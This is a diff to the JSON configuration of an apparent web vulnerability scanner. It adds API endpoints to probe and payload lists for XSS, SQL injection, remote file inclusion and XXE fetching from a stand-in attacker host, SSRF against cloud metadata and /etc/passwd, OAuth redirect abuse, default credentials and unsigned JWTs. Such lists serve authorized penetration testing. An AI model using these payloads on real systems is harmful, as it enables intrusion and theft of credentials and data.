@@ -41,7 +41,30 @@
       "/config/database.yml", "/config/secrets.yml",
       "/composer.json", "/package.json", "/yarn.lock",
       "/README.md", "/CHANGELOG.md", "/LICENSE.md",
-      "/crossdomain.xml.bak", "/clientaccesspolicy.xml"
+      "clientaccesspolicy.xml"
+    ],
+    "API_PATHS": [
+      "api", "api/v1", "api/v2", "api/v3", "graphql", "swagger", "swagger.json",
+      "api/users", "api/v1/users", "api/v2/users", "api/v3/users",
+      "api/status", "api/v1/status", "api/v2/status", "api/v3/status",
+      "api/health", "api/v1/health", "api/v2/health", "api/v3/health",
+      "api/me", "api/v1/me", "api/v2/me", "api/v3/me",
+      "api/profile", "api/v1/profile", "api/v2/profile", "api/v3/profile",
+      "api/settings", "api/v1/settings", "api/v2/settings", "api/v3/settings",
+      "api/credentials", "api/v1/credentials", "api/v2/credentials", "api/v3/credentials",
+      "api/keys", "api/v1/keys", "api/v2/keys", "api/v3/keys",
+      "api/tokens", "api/v1/tokens", "api/v2/tokens", "api/v3/tokens",
+      "api/auth", "api/v1/auth", "api/v2/auth", "api/v3/auth",
+      "api/login", "api/v1/login", "api/v2/login", "api/v3/login",
+      "api/logout", "api/v1/logout", "api/v2/logout", "api/v3/logout",
+      "api/register", "api/v1/register", "api/v2/register", "api/v3/register",
+      "api/reset", "api/v1/reset", "api/v2/reset", "api/v3/reset",
+      "api/password", "api/v1/password", "api/v2/password", "api/v3/password",
+      "api/info", "api/v1/info", "api/v2/info", "api/v3/info",
+      "api/metrics", "api/v1/metrics", "api/v2/metrics", "api/v3/metrics",
+      "api/prometheus", "api/v1/prometheus", "api/v2/prometheus", "api/v3/prometheus",
+      "api/graphql", "api/v1/graphql", "api/v2/graphql", "api/v3/graphql",
+      "api/graphiql", "api/v1/graphiql", "api/v2/graphiql", "api/v3/graphiql"
     ]
   },
   "PAYLOADS": {
@@ -59,7 +82,9 @@
       "<body onload=alert(1)>",
       "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
       "';alert(String.fromCharCode(88,83,83))//",
-      "onerror=alert(1)>"
+      "onerror=alert(1)>",
+      "<script>alert(document.domain)</script>",
+      "<img src=x onerror=alert(document.domain)>"
     ],
     "SQLI_ERROR_BASED": [
       "'", "\"", "`", "' OR 1=1--", "\" OR 1=1--", "` OR 1=1--", "' OR 'x'='x", "1'", "1\""
@@ -90,9 +115,9 @@
       "php://filter/convert.base64-encode/resource=index.php"
     ],
     "RFI": [
-      "http://evil.com/shell.txt",
-      "https://evil.com/shell.txt",
-      "//evil.com/shell.txt"
+      "http://attacker-domain.com/shell.txt",
+      "https://attacker-domain.com/shell.txt",
+      "//attacker-domain.com/shell.txt"
     ],
     "SSRF": [
       "http://127.0.0.1",
@@ -102,11 +127,14 @@
       "http://instance-data/latest/meta-data/",
       "file:///etc/passwd",
       "http://[::]:80/",
-      "http://127.0.0.1:8080/server-status"
+      "http://127.0.0.1:8080/server-status",
+      "http://[::1]",
+      "http://[::1]:80",
+      "http://[::1]:443"
     ],
     "OPEN_REDIRECT": {
       "params": ["next", "url", "target", "r", "dest", "destination", "redirect_uri", "redirect_url", "redirect", "returnTo", "return_to", "checkout_url"],
-      "payloads": ["//google.com", "/bing.com", "https://google.com", "http://google.com", "/@google.com", "\\google.com"]
+      "payloads": ["//example.com", "/example.com", "https://example.com", "http://example.com", "/@example.com", "\\example.com"]
     },
     "IDOR": [
       "1", "2", "100", "101", "0", "-1",
@@ -148,10 +176,15 @@
         "127.0.0.1:6379",
         "127.0.0.1:8080",
         "127.0.0.1:9000",
+        "127.0.0.1:3000",
+        "127.0.0.1:5000",
+        "127.0.0.1:8000",
         "127.0.0.1:9200",
         "127.0.0.1:5601",
         "169.254.169.254",
-        "metadata.google.internal"
+        "metadata.google.internal",
+        "[::1]",
+        "[::]"
       ],
       "PATHS": [
         "/server-status",
@@ -169,8 +202,8 @@
     },
     "XXE": [
       "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
-      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe.dtd\">]>",
-      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe;]>"
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker-domain.com/xxe.dtd\">]>",
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker-domain.com/xxe.dtd\"> %xxe;]>"
     ],
     "NOSQL_INJECTION": [
       "{\"$where\": \"sleep(5000)\"}",
@@ -187,9 +220,11 @@
       "stripe_api_key=", "paypal_api_key="
     ],
     "CORS_MISCONFIGURATION": [
-      "Origin: evil.com", "Origin: null", "Origin: https://target.com.evil.com", "Origin: https://target.com%0Aevil.com"
+      "https://attacker-domain.com", "null", "https://target.com.attacker-domain.com"
     ],
-    "GRAPHQL_INTROSPECTION": [ "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { name description type { ...TypeRef } defaultValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }" ],
+    "GRAPHQL_INTROSPECTION": [
+      "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { name description type { ...TypeRef } defaultValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
+    ],
     "DEFAULT_CREDS": [
       {"username": "admin", "password": "password"},
       {"username": "admin", "password": "admin"},
@@ -203,6 +238,13 @@
       ".eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.",
       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+    ],
+    "OAUTH_MISCONFIG": [
+      "redirect_uri=https://attacker-domain.com",
+      "redirect_uri=http://localhost",
+      "redirect_uri=https://target.com.attacker-domain.com",
+      "scope=invalid_scope",
+      "client_id=invalid_client"
     ]
   },
   "PROTOTYPE_POLLUTION": {
